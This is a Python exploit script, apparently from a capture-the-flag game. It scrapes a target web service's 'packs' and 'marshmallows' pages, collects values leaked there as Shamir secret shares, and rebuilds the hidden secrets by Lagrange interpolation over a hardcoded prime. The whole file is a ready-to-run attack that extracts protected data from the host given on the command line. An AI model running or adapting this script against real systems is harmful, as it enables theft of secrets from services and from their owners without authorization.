#!/usr/bin/env python3

import re
import sys
import requests


URL = 'http://%s:17171/' % sys.argv[1]


def _extended_gcd(a, b):
    x = 0
    last_x = 1
    y = 1
    last_y = 0
    while b != 0:
        quot = a // b
        a, b = b, a%b
        x, last_x = last_x - quot * x, x
        y, last_y = last_y - quot * y, y
    return last_x, last_y


def _divmod(num, den, p):
    inv, _ = _extended_gcd(den, p)
    return num * inv


def _lagrange_interpolate(x, x_s, y_s, p):
    k = len(x_s)
    assert k == len(set(x_s)), "points must be distinct"
    def PI(vals):  # upper-case PI -- product of inputs
        accum = 1
        for v in vals:
            accum *= v
        return accum
    nums = []  # avoid inexact division
    dens = []
    for i in range(k):
        others = list(x_s)
        cur = others.pop(i)
        nums.append(PI(x - o for o in others))
        dens.append(PI(cur - o for o in others))
    den = PI(dens)
    num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p)
               for i in range(k)])
    return (_divmod(num, den, p) + p) % p


def recover_secret(shares, prime):
    if len(shares) < 2:
        raise ValueError("need at least two shares")
    x_s, y_s = zip(*shares)
    return _lagrange_interpolate(0, x_s, y_s, prime)


def get_packs_list(limit):
    html = requests.get(URL + 'packs').text
    return re.findall('/packs/(.*?)">', html)[:limit]
    

def get_marshmallows_list(guid):
    html = requests.get(URL + 'packs/' + guid).text
    return re.findall('/marshmallows/(.*?)">', html)


def get_number(guid):
    html = requests.get(URL + 'marshmallows/' + guid).text
    return int(re.findall('value="(.*?)"', html)[1])


if __name__ == '__main__':
    prime = 12058950698856173324983236458418086340362644737326952033848207975666636738909947835100603153200557571796444486564391552670171783376177474858071463819335779
    for pack_guid in get_packs_list(10):
        numbers = []
        for marshmallow_guid in get_marshmallows_list(pack_guid):
            numbers.append((len(numbers) + 2, get_number(marshmallow_guid)))
        print(recover_secret(numbers, prime).to_bytes(32, 'little'))
